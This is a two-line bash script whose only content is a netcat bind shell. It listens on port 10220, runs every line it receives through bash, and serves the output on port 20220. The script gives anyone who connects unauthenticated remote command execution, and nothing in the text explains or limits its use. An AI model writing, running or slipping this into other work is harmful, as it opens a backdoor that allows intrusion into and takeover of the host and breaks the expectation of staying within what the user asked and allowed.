#!/bin/bash
nc -lk 10220 | bash 2>&1 | nc -lk 20220
